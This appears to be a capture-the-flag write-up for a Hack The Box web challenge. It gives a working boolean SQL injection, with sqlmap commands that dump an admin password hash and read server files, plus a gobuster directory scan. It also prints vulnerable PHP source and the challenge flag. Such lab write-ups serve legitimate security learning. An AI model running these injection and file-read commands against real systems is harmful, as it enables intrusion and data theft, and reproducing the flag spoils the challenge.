# Freelancer

## Notes

Vulnerable to boolean injection
```
http://138.68.171.242:31673/portfolio.php?id=1 AND 1=2
```

SQLMap
```bash
$ python3 sqlmap.py -u http://138.68.171.242:31673/portfolio.php\?id\=1 --technique=B --tables 
... <snip> ...
[02:31:13] [INFO] fetching tables for databases: 'freelancer, information_schema, mysql, performance_schema'
[02:31:13] [INFO] fetching number of tables for database 'information_schema'
... <snip> ...
```

Determine tables in `freelancer`

```bash
$ python3 sqlmap.py -u http://138.68.171.242:31673/portfolio.php\?id\=1 --technique=B --tables --dbms=mysql -D freelancer
... <snip> ...
[02:32:21] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[02:32:21] [INFO] fetching tables for database: 'freelancer'
[02:32:21] [INFO] fetching number of tables for database 'freelancer'
[02:32:21] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[02:32:21] [INFO] retrieved: 2
[02:32:23] [INFO] retrieved: portfolio
[02:32:39] [INFO] retrieved: safeadmin
Database: freelancer
[2 tables]
+-----------+
| portfolio |
| safeadmin |
+-----------+
... <snip> ...
```

Retrieving column data from `safeadmin`

```bash
$ python3 sqlmap.py -u http://138.68.171.242:31673/portfolio.php\?id\=1 --technique=B --tables --dbms=mysql -D freelancer -T safeadmin --dump --threads 4
... <snip> ...
Database: freelancer
Table: safeadmin
[1 entry]
+----+--------------------------------------------------------------+----------+---------------------+
| id | password                                                     | username | created_at          |
+----+--------------------------------------------------------------+----------+---------------------+
| 1  | $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K | safeadm  | 2019-07-16 20:25:45 |
+----+--------------------------------------------------------------+----------+---------------------+
... <snip> ...
```

**Unable to crack the hash

Read `portofolio.php` file

```python
python3 sqlmap.py -u http://138.68.171.242:31673/portfolio.php\?id\=1 --technique=B --dbms=mysql --file-read=/var/www/html/portfolio.php --threads 10
```

```
<?php
  // Include config file
  require_once "administrat/include/config.php"; # another file
  ?>
    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
    <!-- Portfolio Modals -->

    <!-- Portfolio Modal 1 -->

      <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
      
          <div class="modal-body text-center">
            <div class="container">
              <div class="row justify-content-center">
                <div class="col-lg-8">
                  <!-- Portfolio Modal - Title -->
                  <!-- Icon Divider -->
                  <div class="divider-custom">
      
                  <!-- Portfolio Modal - Image -->
                  <img class="img-fluid rounded mb-5" src="img/portfolio/cabin.png" width="300" height="300">
                  <!-- Portfolio Modal - Text -->
                  <p class="mb-5"><?php

  $id = isset($_GET['id']) ? $_GET['id'] : '';

  $query = "SELECT * FROM portfolio WHERE id = $id";
  if ($result = mysqli_query($link, $query)) {

      /* fetch associative array */
      while ($row = mysqli_fetch_row($result)) {
          printf ("%s - %s\n", $row[1], $row[2]);
      }
      
      /* free result set */
      mysqli_free_result($result);

  }

  /* close connection */
  mysqli_close($link);
  ?></p>


              </div>
            </div>
          </div>
        </div>
      </div>

    </di


```

Directory bruteforce on `http://138.68.171.242:31673/administrat/`

```bash
$ gobuster dir -u http://138.68.171.242:31673/administrat/ -x php,txt -w /opt/wordlist/raft-large-directories.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://138.68.171.242:31673/administrat/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/wordlist/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2021/03/29 03:18:17 Starting gobuster in directory enumeration mode
===============================================================
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/include              (Status: 301) [Size: 339] [--> http://138.68.171.242:31673/administrat/include/]
/index.php            (Status: 200) [Size: 1213]
/panel.php            (Status: 302) [Size: 0] [--> index.php]
```

Flag found in `panel.php`

```bash
python3 sqlmap.py -u http://138.68.171.242:31673/portfolio.php\?id\=1 --technique=B --dbms=mysql --file-read=/var/www/html/administrat/panel.php --threads 10
```

```php
<?php
// Initialize the session
session_start();

// Check if the user is logged in, if not then redirect him to login page
if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
    header("location: index.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Welcome</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css">
  <link rel="icon" href="../favicon.ico" type="image/x-icon">
    <style type="text/css">
        body{ font: 14px sans-serif; text-align: center; }
    </style>
</head>
<body>
    <div class="page-header">
        <h1>Hi, <b><?php echo htmlspecialchars($_SESSION["username"]); ?></b>. Welcome to our site.</h1><b><a href="logout.php">Logout</a></b>
<br><br><br>
        <h1>HTB{s4ff_3_1_w33b_fr4__l33nc_3}</h1>
    </div>
</body>
</html>
```

